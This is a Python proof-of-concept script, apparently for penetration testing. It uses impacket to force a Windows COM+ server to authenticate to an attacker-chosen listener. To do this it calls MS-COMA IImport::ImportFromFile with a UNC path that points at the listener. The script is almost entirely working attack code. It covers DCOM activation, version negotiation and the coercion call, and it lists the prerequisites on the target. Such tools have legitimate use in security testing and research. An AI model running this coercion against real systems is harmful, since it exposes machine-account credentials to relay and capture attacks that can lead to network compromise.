#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Proof of concept for coercing authentication with MS-COMA::IImport::ImportFromFile() (opnum 3).
#
# ImportFromFile imports a COM+ conglomeration from an installer package file. pwszInstallerPackage
# is "a path in UNC" ([MS-COMA] 3.1.4.12.1) and the server opens it to verify it exists, so a UNC
# path coerces the COMA server (machine account) to authenticate to the listener.
#
# This is a DCOM method, reached by activating the COMA catalog server and negotiating a catalog
# version first:
#   CoCreateInstanceEx(CLSID_COMAServer, IID_ICatalogSession)
#   ICatalogSession::InitializeSession(flVerLower=4.0, flVerUpper=5.0)   [opnum 7]  (mandatory)
#   QueryInterface -> IID_IImport   (on the SAME object)
#   IImport::ImportFromFile(pwszInstallerPackage="\\<listener>\share\pkg.msi", ...)  [opnum 3]
#
# PREREQUISITE on the target: HKLM\SOFTWARE\Microsoft\COM3\RemoteAccessEnabled = 1 (REG_DWORD).
# When 0 (the default), activation fails with CO_E_CLASS_DISABLED. Installing the "COM+ Network
# Access" feature does NOT set this value; it is the Component Services "Enable remote access"
# toggle. Requires COM+/catalog administrative access.
import sys, argparse
from impacket.dcerpc.v5.dcomrt import DCOMConnection, ORPCTHIS, ORPCTHAT
from impacket.dcerpc.v5.ndr import NDRCALL, NDRFLOAT
from impacket.dcerpc.v5.dtypes import LPWSTR, WSTR, DWORD, LONG, GUID, NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.uuid import string_to_bin, uuidtup_to_bin

CLSID_COMAServer    = string_to_bin('182C40F0-32E4-11D0-818B-00A0C9231C29')
IID_ICatalogSession = uuidtup_to_bin(('182C40FA-32E4-11D0-818B-00A0C9231C29', '0.0'))
IID_IImport         = uuidtup_to_bin(('C2BE6970-DF9E-11D1-8B87-00C04FD7A924', '0.0'))


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        return 'ImportFromFile HRESULT: 0x%08x' % (self.error_code or 0)


# ICatalogSession::InitializeSession (opnum 7) -- catalog version negotiation (mandatory).
class InitializeSession(NDRCALL):
    opnum = 7
    structure = (
        ('ORPCthis', ORPCTHIS),
        ('flVerLower', NDRFLOAT),
        ('flVerUpper', NDRFLOAT),
        ('reserved', LONG),
    )

class InitializeSessionResponse(NDRCALL):
    structure = (
        ('ORPCthat', ORPCTHAT),
        ('pflVerSession', NDRFLOAT),
        ('ErrorCode', DWORD),
    )


# IImport::ImportFromFile (opnum 3).
class ImportFromFile(NDRCALL):
    opnum = 3
    structure = (
        ('ORPCthis', ORPCTHIS),
        ('pwszModuleDestination', LPWSTR),
        ('pwszInstallerPackage', WSTR),
        ('pwszUser', LPWSTR),
        ('pwszPassword', LPWSTR),
        ('pwszRemoteServerName', LPWSTR),
        ('dwFlags', DWORD),
        ('reserved1', GUID),
        ('reserved2', DWORD),
    )

class ImportFromFileResponse(NDRCALL):
    structure = (('ORPCthat', ORPCTHAT), ('ErrorCode', DWORD))


if __name__ == '__main__':
    print("Windows auth coerce using MS-COMA::IImport::ImportFromFile()\n")
    ap = argparse.ArgumentParser(add_help=True, description="Coerce via MS-COMA::IImport::ImportFromFile()")
    ap.add_argument("-u", "--username", default="")
    ap.add_argument("-p", "--password", default="")
    ap.add_argument("-d", "--domain", default="")
    ap.add_argument("--hashes", action="store", metavar="[LM]:NT")
    ap.add_argument("--share", default="share", help="share component of the UNC installer-package path")
    ap.add_argument("listener", help="listener the target should authenticate to")
    ap.add_argument("target", help="target COMA (COM+) server")
    o = ap.parse_args()
    lm, nt = ('', '')
    if o.hashes:
        lm, nt = o.hashes.split(':')

    dcom = DCOMConnection(o.target, o.username, o.password, o.domain, lm, nt, oxidResolver=True)
    try:
        print("[>] Activating CLSID_COMAServer (IID_ICatalogSession) ...")
        iSess = dcom.CoCreateInstanceEx(CLSID_COMAServer, IID_ICatalogSession)
        print("[>] Negotiating catalog version (InitializeSession 4.0-5.0) ...")
        req = InitializeSession()
        req['flVerLower'] = 4.0
        req['flVerUpper'] = 5.0
        req['reserved'] = 0
        # Each DCOM method call MUST carry the interface IPID as the ORPC object id.
        resp = iSess.request(req, IID_ICatalogSession, iSess.get_iPid())
        print("[+] Negotiated catalog version = %s" % resp['pflVerSession'])

        print("[>] QueryInterface -> IImport (same object) ...")
        iImp = iSess.RemQueryInterface(1, (IID_IImport,))

        req2 = ImportFromFile()
        req2['pwszModuleDestination'] = NULL
        req2['pwszInstallerPackage'] = ('\\\\%s\\%s\\pkg.msi' % (o.listener, o.share)) + '\x00'
        req2['pwszUser'] = NULL
        req2['pwszPassword'] = NULL
        req2['pwszRemoteServerName'] = NULL
        req2['dwFlags'] = 0
        req2['reserved1'] = b'\x00' * 16
        req2['reserved2'] = 0
        print("[>] Calling ImportFromFile(pwszInstallerPackage='\\\\%s\\%s\\pkg.msi') ..." % (o.listener, o.share))
        try:
            iImp.request(req2, IID_IImport, iImp.get_iPid())
            print("[+] ImportFromFile returned S_OK, check your listener.")
        except Exception as e:
            print("[i] ImportFromFile returned: %s" % e)
            print("[i] The call was processed by the target, check your listener.")
    finally:
        dcom.disconnect()
    sys.exit()
